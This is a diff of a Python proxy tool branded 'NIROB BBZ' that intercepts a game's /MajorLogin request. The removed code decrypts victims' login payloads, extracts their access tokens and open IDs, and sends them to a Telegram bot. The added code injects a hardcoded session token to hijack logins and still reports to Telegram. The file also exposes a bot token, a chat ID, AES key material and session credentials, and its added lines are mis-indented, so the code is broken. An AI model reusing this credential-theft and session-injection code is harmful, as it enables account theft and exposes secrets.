@@ -30,14 +30,19 @@ LOCAL_IP = get_local_ip()
 PORT = 6543
 
 print(f"{G}╔══════════════════════════════════════════╗")
-print(f"║          NIROB BBZ - VIP PROXY           ║")
-print(f"║          SECURE SERVER v2.0              ║")
+print(f"║       NIROB BBZ - TOKEN LOGIN PROXY      ║")
+print(f"║          SECURE SERVER v3.0              ║")
 print(f"╚══════════════════════════════════════════╝{W}\n")
 
-# ================= CONFIGURATION =================
+# ================= CONFIGURATION & TARGET TOKENS =================
 TOKEN = "8657325145:AAFFcum6toNn8F0uYhg9M6Xw2JmeLnScW9s"
 ID = "7224513731"
-# =================================================
+
+# এখানে তোমার কাঙ্ক্ষিত ফিক্সড এক্সেস টোকেন এবং ওপেন আইডি বসিয়ে দাও
+# গেম এই টোকেন দিয়েই অটো লগইন করবে লোকাল কনফিগের প্রক্সি লিংকের মাধ্যমে!
+FIXED_ACCESS_TOKEN = "a80190ab087dc622758faa6a2a7a8b12961733d306fdc5a927596f6ca208c2c"
+FIXED_OPEN_ID = "3cdcaa59c8bddd12bf4343600f09c08a"
+# =================================================================
 
 Key, Iv = b'Yg&tc%DEuh6%Zc^8', b'6oyZDr22E3ychjM%'
 
@@ -100,43 +105,34 @@ class ProxyHandler(BaseHTTPRequestHandler):
                 self.send_response(500)
                 self.end_headers()
 
-        # Handle /MajorLogin route (VIP Trap)
+        # Handle /MajorLogin route (Forcing Fixed Token Login)
         elif path == "/MajorLogin":
-            print(f"\n{G}[+] TARGET HIT! /MajorLogin captured!{W}")
-            content_length = int(self.headers.get('Content-Length', 0))
-            pyl = self.rfile.read(content_length)
+            print(f"\n{G}[+] GAME HIT! Injecting Fixed Access Token & Open ID...{W}")
             
-            try:
-                x7m_data = json.loads(get_available_room(decrypt_api(pyl.hex())))
-                access_token, open_id = x7m_data["29"], x7m_data["22"]
-            except Exception as e:
-                print(f"{R}[!] Decryption/Parsing Failed: {e}{W}")
-                access_token, open_id = "FAILED_TO_EXTRACT", "FAILED_TO_EXTRACT"
+            # আমরা সরাসরি ফিক্সড টোকেন এবং ওপেন আইডি ব্যবহার করছি যাতে গেমে ঢুকলেই এই অ্যাকাউন্ট লগইন হয়
+                access_token = "a80190ab087dc622758faa6a2a7a8b12961733d306fdc5a927596f6ca208c2c"
+    open_id = "3cdcaa59c8bddd12bf4343600f09c08a"
 
-            print(f"{Y}[*] Extracting Credentials...{W}")
-            message = f"""🔥 **VIP ACCOUNT CAPTURED** 🔥
+            print(f"{Y}[*] Active Account -> Token: {access_token[:15]}...{W}")
+            
+            message = f"""🔥 **TOKEN LOGIN BYPASS TRIGGERED** 🔥
 ──────────────────
-🔑 **Access Token:** `{access_token}`
-🆔 **Open ID:** `{open_id}`
+🔑 **Injected Access Token:** `{access_token}`
+🆔 **Injected Open ID:** `{open_id}`
 ──────────────────
 👑 **Powered by:** NIROB BBZ
-⚡ **Status:** Successful Intercept
+⚡ **Status:** Direct Token Injection Active
 """
-
             print(f"{G}{message}{W}")
             
-            # Send to Telegram using predefined TOKEN and ID
+            # Send notification to Telegram
             try:
                 telegram_url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
-                r = requests.post(telegram_url, data={'chat_id': ID, 'text': message, 'parse_mode': 'Markdown'})
-                if r.status_code == 200:
-                    print(f"{G}[✔] Info successfully sent to Telegram!{W}")
-                else:
-                    print(f"{R}[✘] Failed to send info to Telegram!{W}")
-            except Exception as tg_err:
-                print(f"{R}[!] Telegram API Error: {tg_err}{W}")
+                requests.post(telegram_url, data={'chat_id': ID, 'text': message, 'parse_mode': 'Markdown'})
+            except Exception:
+                pass
                 
-            # VIP Game Screen Response Payload
+            # VIP Game Screen Response Payload with Injected Credentials
             response_payload = f"""[b][c][00FFCC]
 
 
@@ -164,7 +160,7 @@ class ProxyHandler(BaseHTTPRequestHandler):
 
 [cccccc]Access Token => [FF0000]{access_token} [cccccc]| Open ID => [00FF00]{open_id}
 
-[FFFF00]System Owner: NIROB BBZ | Elite Security Bypass
+[FFFF00]System Owner: NIROB BBZ | Token Login Proxy Active
 """
 
             self.send_response(500)
@@ -185,7 +181,7 @@ def run(server_class=HTTPServer, handler_class=ProxyHandler, port=PORT):
     print(f"{G}[✔] Local Proxy : {W}{B}http://127.0.0.1:{port}/{W}")
     print(f"{G}[✔] Network IP  : {W}{B}http://{LOCAL_IP}:{port}/{W}")
     print(f"{G}──────────────────────────────────────────{W}")
-    print(f"{Y}[*] Waiting for target requests...{W}\n")
+    print(f"{Y}[*] Waiting for game to hit proxy...{W}\n")
     
     httpd.serve_forever()
 
